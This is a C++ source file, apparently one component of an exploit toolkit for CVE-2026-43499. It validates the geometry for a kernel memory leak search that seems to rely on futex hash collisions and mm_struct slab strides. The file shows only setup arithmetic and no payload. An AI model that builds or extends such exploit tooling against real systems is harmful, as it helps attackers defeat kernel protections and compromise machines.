/** @file backend/cve_2026_43499/leak/snitch_setup.cpp
 *  Deriving the search's shape from what it was given.
 */
#include "backend/cve_2026_43499/leak/snitch_setup.hpp"

namespace ghostlock::backend::cve_2026_43499::leak {
    SnitchSetupVerdict build_snitch_setup(const SnitchInputs &inputs, SnitchSetup &out) noexcept {
        out = SnitchSetup{};
        /* The two the search cannot do without, and the one that would make it compare
         *  nothing. Each is a named refusal rather than a zero that walks forever. */
        if (inputs.page_size == 0U || inputs.mm_struct_size == 0U) {
            return SnitchSetupVerdict::GeometryMissing;
        }
        if (inputs.collisions < 2U || inputs.thread_count == 0U || inputs.possible_cpus == 0U) {
            return SnitchSetupVerdict::GeometryMissing;
        }
        /* The slab stride is a page shifted by the order the profile asks for, and the
         *  shift must not lose bits: a stride that wraps would walk backwards. */
        if (inputs.mm_slab_order >= 63U || inputs.page_size > (UINT64_MAX >> inputs.mm_slab_order)) {
            return SnitchSetupVerdict::GeometryMissing;
        }
        const std::size_t wide_table = futex_hash_table_size_for(static_cast<uint32_t>(inputs.possible_cpus));
        if (wide_table == 0U || wide_table > UINT32_MAX) {
            return SnitchSetupVerdict::GeometryMissing;
        }
        const std::uint32_t table_size = static_cast<std::uint32_t>(wide_table);
        out.strides.coarse = kCoarseStride;
        out.strides.slab = inputs.page_size << inputs.mm_slab_order;
        out.strides.candidate = inputs.mm_struct_size;
        out.collisions = inputs.collisions;
        out.thread_count = inputs.thread_count;
        out.futex_table_size = table_size;
        return SnitchSetupVerdict::Ok;
    }
}  // namespace ghostlock::backend::cve_2026_43499::leak
